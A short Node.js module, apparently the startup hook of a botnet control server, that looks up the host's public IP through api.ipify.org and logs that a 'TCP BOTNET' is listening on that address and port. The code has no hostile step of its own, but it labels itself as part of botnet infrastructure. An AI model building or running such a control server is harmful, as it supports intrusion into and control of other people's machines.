const axios = require('axios');

module.exports = async (server, socket) => {
	const reqRes = await axios.get('https://api.ipify.org')

	console.log(`TCP BOTNET IS LISTENING IN ${reqRes.data}:${server.address().port}`);
}